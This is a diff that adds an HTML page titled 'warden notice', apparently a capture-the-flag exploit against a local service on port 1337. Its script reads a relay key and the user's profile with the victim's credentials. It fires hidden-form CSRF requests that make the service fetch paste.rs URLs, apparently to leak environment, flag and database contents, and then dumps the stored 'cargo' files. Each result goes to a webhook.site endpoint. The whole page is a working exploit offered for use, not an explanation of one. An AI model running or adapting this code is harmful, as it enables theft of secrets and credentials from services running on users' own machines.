@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>warden notice</title></head>
+<body>
+<pre id="l">init</pre>
+<script>
+const WH = "https://webhook.site/69285a81-ff8c-45d2-838a-ae4a3a9830f8";
+const T = "http://127.0.0.1:1337";
+const log = (m) => {
+  try { document.getElementById("l").textContent += "\n" + m; } catch (e) {}
+  try { new Image().src = WH + "?m=" + encodeURIComponent(String(m).slice(0, 1400)); } catch (e) {}
+  try { fetch(WH + "?m=" + encodeURIComponent(String(m).slice(0, 1400)), {mode: "no-cors"}); } catch (e) {}
+};
+function csrfPost(path, body) {
+  const iframe = document.createElement("iframe");
+  iframe.name = "x" + Math.random().toString(36).slice(2);
+  iframe.style.display = "none";
+  document.body.appendChild(iframe);
+  const f = document.createElement("form");
+  f.method = "POST";
+  f.action = T + path;
+  f.target = iframe.name;
+  f.enctype = "application/x-www-form-urlencoded";
+  for (const [k, v] of Object.entries(body)) {
+    const i = document.createElement("input");
+    i.type = "hidden"; i.name = k; i.value = v;
+    f.appendChild(i);
+  }
+  document.body.appendChild(f);
+  f.submit();
+}
+async function dumpCargo(tag) {
+  const c = await fetch(T + "/api/cargo", { credentials: "include" }).then(r => r.text());
+  log(tag + "_list:" + c);
+  let j; try { j = JSON.parse(c); } catch (e) { return; }
+  for (const f of (j.data || [])) {
+    const body = await fetch(T + "/api/cargo/" + encodeURIComponent(f) + "/raw", { credentials: "include" }).then(r => r.text());
+    log(tag + "_file:" + f + ":" + body.slice(0, 1200));
+  }
+}
+(async () => {
+  log("start");
+  try {
+    const k = await fetch(T + "/api/relay-key", { credentials: "include" }).then(r => r.text());
+    log("key:" + k);
+  } catch (e) { log("keyerr:" + e); }
+  try {
+    const me = await fetch(T + "/broker/me", { credentials: "include" }).then(r => r.text());
+    log("me:" + me.replace(/\s+/g, " ").slice(0, 700));
+  } catch (e) { log("meerr:" + e); }
+
+  csrfPost("/api/fetch", { url: "https://paste.rs/08UQN" });
+  log("csrf_env");
+  for (let i = 0; i < 20; i++) {
+    await new Promise(r => setTimeout(r, 200));
+    try { await dumpCargo("env" + i); } catch (e) { log("e" + i + ":" + e); }
+  }
+
+  csrfPost("/api/fetch", { url: "https://paste.rs/W3xwO" });
+  log("csrf_flag");
+  for (let i = 0; i < 15; i++) {
+    await new Promise(r => setTimeout(r, 200));
+    try { await dumpCargo("flag" + i); } catch (e) { log("f" + i + ":" + e); }
+  }
+
+  csrfPost("/api/fetch", { url: "https://paste.rs/wXMhm" });
+  log("csrf_db");
+  for (let i = 0; i < 15; i++) {
+    await new Promise(r => setTimeout(r, 200));
+    try { await dumpCargo("db" + i); } catch (e) { log("d" + i + ":" + e); }
+  }
+
+  log("done");
+})();
+</script>
+</body></html>
